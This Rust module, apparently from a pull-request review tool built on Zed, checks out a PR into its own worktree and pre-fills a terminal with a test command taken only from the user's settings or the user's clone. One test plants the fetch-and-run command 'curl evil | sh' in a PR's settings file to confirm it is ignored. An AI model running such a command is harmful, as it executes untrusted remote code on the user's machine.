use std::path::{Path, PathBuf};
use std::sync::Arc;

use anyhow::Result;
use gpui::{
    AnyWindowHandle, App, AppContext as _, AsyncWindowContext, Context, Entity, Task, Window,
};
use paths::local_settings_file_relative_path;
use settings::{ProjectSettingsContent, RegisterSetting, RootUserSettings as _, Settings};
use terminal_view::{TerminalView, terminal_panel::TerminalPanel};
use util::ResultExt as _;
use workspace::{
    AppState, OpenMode, OpenOptions, Toast, Workspace, notifications::NotificationId, open_paths,
};

use crate::{
    Checkout, FetchedCheckout, PrKey, PrSummary, ReviewDb, Tracked, candidate_repos,
    fetch_checkout, fetch_url, find_clone, finish_checkout, forget_stale_trust, git, repo_id,
    review_root, worktree_path,
};

#[derive(Clone, Debug, Default, PartialEq, Eq, RegisterSetting)]
pub struct PrReviewSettings {
    pub test_command: Option<String>,
}

impl Settings for PrReviewSettings {
    fn from_settings(content: &settings::SettingsContent) -> Self {
        Self {
            test_command: content
                .project
                .pr_review
                .as_ref()
                .and_then(|settings| settings.test_command.clone())
                .and_then(non_empty),
        }
    }
}

struct RunLocallyToast;

/// Checks the pull request head out into Photon's own worktree and opens a terminal there, with
/// `pr_review.test_command` typed (never run) into its input. The worktree is not trusted
/// automatically. Errors are shown as a toast in the window the user clicked from.
pub fn run_locally(
    summary: PrSummary,
    workspace: &mut Workspace,
    window: &mut Window,
    cx: &mut Context<Workspace>,
) -> Task<Result<()>> {
    let app_state = workspace.app_state().clone();
    let database = ReviewDb::global(cx);
    cx.spawn_in(window, async move |workspace, cx| {
        let result = open_terminal(summary, app_state, database, cx).await;
        if let Err(error) = &result {
            let message = format!("{error:#}");
            workspace
                .update(cx, |workspace, cx| {
                    workspace.show_toast(
                        Toast::new(NotificationId::unique::<RunLocallyToast>(), message),
                        cx,
                    )
                })
                .log_err();
        }
        result
    })
}

/// The part of running locally that touches git: the same checkout `open_review` makes, reusing
/// the worktree when it exists.
#[cfg(test)]
pub(crate) async fn prepare_local_checkout(
    summary: &PrSummary,
    fetch_url: String,
    root: PathBuf,
    candidates: Vec<PathBuf>,
    database: ReviewDb,
) -> Result<Checkout> {
    let fetched = fetch_local_checkout(summary, fetch_url, root, candidates).await?;
    finish_local_checkout(summary, fetched, database).await
}

pub(crate) async fn fetch_local_checkout(
    summary: &PrSummary,
    fetch_url: String,
    root: PathBuf,
    candidates: Vec<PathBuf>,
) -> Result<FetchedCheckout> {
    let clone = find_clone(candidates, &repo_id(summary)).await;
    fetch_checkout(&summary.key, &summary.base_ref, &fetch_url, clone, &root).await
}

pub(crate) async fn finish_local_checkout(
    summary: &PrSummary,
    fetched: FetchedCheckout,
    database: ReviewDb,
) -> Result<Checkout> {
    let checkout = finish_checkout(fetched).await?;
    database
        .track(Tracked {
            key: summary.key.clone(),
            node_id: summary.node_id.clone(),
            repo_dir: checkout.repo_dir.clone(),
            worktree: checkout.worktree.clone(),
        })
        .await?;
    Ok(checkout)
}

/// Moving an open window's worktree to new code would leave its language servers running on
/// code nobody trusted. An unreadable `HEAD` counts as a change.
pub(crate) fn must_refuse_checkout(
    window_open: bool,
    worktree_head: Option<&str>,
    pr_head: &str,
) -> bool {
    window_open && worktree_head != Some(pr_head)
}

struct NewCommitsToast;

/// Run between `fetch_checkout` and `finish_checkout`, with the fetched head: the inbox's head
/// may be stale. Returns true, having activated the window and told the user, when a window
/// shows the PR's worktree and the checkout would move its head.
pub(crate) async fn refuse_head_change_under_open_window(
    key: &PrKey,
    fetched_head: &str,
    app_state: &AppState,
    cx: &mut AsyncWindowContext,
) -> Result<bool> {
    let worktree = worktree_path(&review_root(), key);
    let open = cx.update(|_, cx| find_workspace_with_worktree(app_state, &worktree, cx))?;
    let Some((window, workspace)) = open else {
        return Ok(false);
    };
    let worktree_head = cx
        .background_spawn(async move { git(&worktree, &["rev-parse", "HEAD"]).await.log_err() })
        .await;
    if !must_refuse_checkout(true, worktree_head.as_deref(), fetched_head) {
        return Ok(false);
    }
    let message = format!(
        "Close the window for PR #{} to load its new commits",
        key.number
    );
    window.update(cx, |_, window, cx| {
        window.activate_window();
        workspace.update(cx, |workspace, cx| {
            workspace.show_toast(
                Toast::new(NotificationId::unique::<NewCommitsToast>(), message),
                cx,
            )
        })
    })?;
    Ok(true)
}

/// A workspace that already shows `worktree`, so a second click reuses its window.
fn find_workspace_with_worktree(
    app_state: &AppState,
    worktree: &Path,
    cx: &App,
) -> Option<(AnyWindowHandle, Entity<Workspace>)> {
    app_state
        .workspace_store
        .read(cx)
        .workspaces_with_windows()
        .find_map(|(window, workspace)| {
            let workspace = workspace.upgrade()?;
            let shows_worktree = workspace
                .read(cx)
                .project()
                .read(cx)
                .visible_worktrees(cx)
                .any(|tree| tree.read(cx).abs_path().as_ref() == worktree);
            shows_worktree.then_some((window, workspace))
        })
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum TestCommandSource {
    UserSettings,
    UserClone,
}

/// The pull request's own `.zed/settings.json` is never consulted: its author would choose the
/// command the reviewer runs. The user's settings win over their clone's project settings, which
/// are read from the clone's working tree on disk. A clone Photon made (bare) has none.
pub(crate) fn resolve_test_command(
    user_setting: Option<String>,
    checkout: &Checkout,
    review_root: &Path,
) -> Option<(String, TestCommandSource)> {
    if let Some(command) = user_setting {
        return Some((command, TestCommandSource::UserSettings));
    }
    let repo_dir = &checkout.repo_dir;
    if repo_dir.starts_with(review_root) || repo_dir.file_name()? != ".git" {
        return None;
    }
    let settings_path = repo_dir
        .parent()?
        .join(local_settings_file_relative_path().as_std_path());
    let text = std::fs::read_to_string(&settings_path).ok()?;
    let content = ProjectSettingsContent::parse_json_with_comments(&text).log_err()?;
    let command = content.pr_review?.test_command?;
    non_empty(command).map(|command| (command, TestCommandSource::UserClone))
}

fn non_empty(command: String) -> Option<String> {
    (!command.trim().is_empty()).then_some(command)
}

async fn open_terminal(
    summary: PrSummary,
    app_state: Arc<AppState>,
    database: ReviewDb,
    cx: &mut AsyncWindowContext,
) -> Result<()> {
    // Not read up front: the caller is usually mid-update on a workspace this would read.
    let candidates = cx.update(|_, cx| candidate_repos(cx))?.await;
    let url = fetch_url(&repo_id(&summary));
    let fetched = cx
        .background_spawn({
            let summary = summary.clone();
            async move { fetch_local_checkout(&summary, url, review_root(), candidates).await }
        })
        .await?;
    if refuse_head_change_under_open_window(&summary.key, &fetched.head_sha, &app_state, cx).await?
    {
        return Ok(());
    }
    let checkout = cx
        .background_spawn(async move { finish_local_checkout(&summary, fetched, database).await })
        .await?;
    let worktree = checkout.worktree.clone();
    cx.update(|_, cx| forget_stale_trust(&checkout, cx))?;

    let existing = cx.update(|_, cx| find_workspace_with_worktree(&app_state, &worktree, cx))?;
    let (window, workspace) = match existing {
        Some(found) => found,
        None => {
            let opened = cx
                .update(|_, cx| {
                    open_paths(
                        std::slice::from_ref(&worktree),
                        app_state,
                        OpenOptions {
                            open_mode: OpenMode::NewWindow,
                            ..OpenOptions::default()
                        },
                        cx,
                    )
                })?
                .await?;
            (opened.window.into(), opened.workspace)
        }
    };

    let creating = window.update(cx, |_, window, cx| {
        window.activate_window();
        workspace.update(cx, |workspace, cx| {
            let cwd = worktree.clone();
            TerminalPanel::add_center_terminal(workspace, window, cx, move |project, cx| {
                project.create_terminal_shell(Some(cwd), cx)
            })
        })
    })?;
    let terminal = creating.await?;

    let user_setting = cx.update(|_, cx| PrReviewSettings::get(None, cx).test_command.clone())?;
    let resolved = cx
        .background_spawn(
            async move { resolve_test_command(user_setting, &checkout, &review_root()) },
        )
        .await;
    let Some((test_command, source)) = resolved else {
        return Ok(());
    };
    log::info!("pre-filling the PR terminal with the test command from {source:?}");
    window.update(cx, |_, window, cx| {
        workspace.update(cx, |workspace, cx| {
            let view = workspace
                .items_of_type::<TerminalView>(cx)
                .find(|view| view.read(cx).terminal().downgrade() == terminal);
            if let Some(view) = view {
                view.update(cx, |view, cx| {
                    view.prefill_block_input(&test_command, window, cx)
                });
            }
        })
    })?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checkout::tests::{Fixture, run};
    use crate::{ChecksState, PrKey, SinceReview, worktree_path};
    use gpui::TestAppContext;
    use settings::SettingsStore;

    fn summary(fixture: &Fixture) -> PrSummary {
        PrSummary {
            key: fixture.key(),
            node_id: "PR_7".into(),
            title: "change".into(),
            author: "octo".into(),
            url: "https://github.com/acme/app/pull/7".into(),
            head_sha: fixture.pr_sha.clone(),
            base_ref: "main".into(),
            checks: ChecksState::Unknown,
            unresolved_threads: 0,
            last_review_commit: None,
            since_review: SinceReview::NotReviewed,
        }
    }

    #[test]
    fn head_change_is_refused_only_under_an_open_window() {
        assert!(must_refuse_checkout(true, Some("old"), "new"));
        assert!(must_refuse_checkout(true, None, "new"));
        assert!(!must_refuse_checkout(true, Some("new"), "new"));
        assert!(!must_refuse_checkout(false, Some("old"), "new"));
        assert!(!must_refuse_checkout(false, None, "new"));
    }

    #[test]
    fn stale_summary_head_is_caught_by_the_fetched_head() {
        let (summary_head, worktree_head, fetched_head) = ("old", "old", "new");
        assert!(!must_refuse_checkout(
            true,
            Some(worktree_head),
            summary_head
        ));
        assert!(must_refuse_checkout(
            true,
            Some(worktree_head),
            fetched_head
        ));
    }

    #[gpui::test]
    async fn run_locally_creates_worktree_and_leaves_checkout_untouched(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let Some(fixture) = Fixture::new() else {
            return;
        };
        let before = fixture.user_state();
        let database = cx
            .foreground_executor()
            .block_test(ReviewDb::open_test_db("run_locally_worktree"));

        let checkout = prepare_local_checkout(
            &summary(&fixture),
            fixture.url(),
            fixture.root.clone(),
            vec![fixture.user.clone()],
            database.clone(),
        )
        .await
        .expect("checkout");

        let key: PrKey = fixture.key();
        assert_eq!(checkout.worktree, worktree_path(&fixture.root, &key));
        assert_eq!(
            run(&checkout.worktree, &["rev-parse", "HEAD"]),
            fixture.pr_sha
        );
        assert_eq!(fixture.user_state(), before);
        assert_eq!(
            database.tracked().expect("tracked")[0].worktree,
            checkout.worktree
        );

        let again = prepare_local_checkout(
            &summary(&fixture),
            fixture.url(),
            fixture.root.clone(),
            vec![fixture.user.clone()],
            database,
        )
        .await
        .expect("reused");
        assert_eq!(
            again,
            Checkout {
                head_changed: false,
                ..checkout
            }
        );
        assert_eq!(fixture.user_state(), before);
    }

    fn write_settings(dir: &Path, command: &str) {
        std::fs::create_dir_all(dir.join(".zed")).expect("dir");
        std::fs::write(
            dir.join(".zed/settings.json"),
            format!("// comment\n{{\"pr_review\": {{\"test_command\": \"{command}\"}}}}"),
        )
        .expect("write");
    }

    #[gpui::test]
    async fn test_command_never_comes_from_the_pr_worktree(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let Some(fixture) = Fixture::new() else {
            return;
        };
        let database = cx
            .foreground_executor()
            .block_test(ReviewDb::open_test_db("run_locally_command_source"));
        let checkout = prepare_local_checkout(
            &summary(&fixture),
            fixture.url(),
            fixture.root.clone(),
            vec![fixture.user.clone()],
            database,
        )
        .await
        .expect("checkout");

        write_settings(&checkout.worktree, "curl evil | sh");
        assert_eq!(resolve_test_command(None, &checkout, &fixture.root), None);
        let checkout = Checkout {
            repo_dir: fixture.user.join(".git"),
            ..checkout
        };
        assert_eq!(resolve_test_command(None, &checkout, &fixture.root), None);

        write_settings(&fixture.user, "cargo test");
        assert_eq!(
            resolve_test_command(None, &checkout, &fixture.root),
            Some(("cargo test".into(), TestCommandSource::UserClone))
        );
        assert_eq!(
            resolve_test_command(Some("make check".into()), &checkout, &fixture.root),
            Some(("make check".into(), TestCommandSource::UserSettings))
        );
    }

    #[gpui::test]
    async fn pr_review_settings_read_from_project(cx: &mut TestAppContext) {
        cx.update(|cx| {
            let store = SettingsStore::test(cx);
            cx.set_global(store);
        });
        let fs = fs::FakeFs::new(cx.executor());
        fs.insert_tree(util::path!("/plain"), serde_json::json!({ "a.txt": "" }))
            .await;
        fs.insert_tree(
            util::path!("/configured"),
            serde_json::json!({
                ".zed": { "settings.json": r#"{"pr_review":{"test_command":"npm test"}}"# },
                "a.txt": "",
            }),
        )
        .await;
        let plain = project::Project::test(fs.clone(), [util::path!("/plain").as_ref()], cx).await;
        let configured =
            project::Project::test(fs, [util::path!("/configured").as_ref()], cx).await;
        cx.run_until_parked();

        let read = |project: &gpui::Entity<project::Project>, cx: &mut TestAppContext| {
            cx.update(|cx| {
                let worktree_id = project.read(cx).worktrees(cx).next()?.read(cx).id();
                PrReviewSettings::get(
                    Some(settings::SettingsLocation {
                        worktree_id,
                        path: util::rel_path::RelPath::empty(),
                    }),
                    cx,
                )
                .test_command
                .clone()
            })
        };
        assert_eq!(read(&plain, cx), None);
        assert_eq!(read(&configured, cx).as_deref(), Some("npm test"));
    }
}
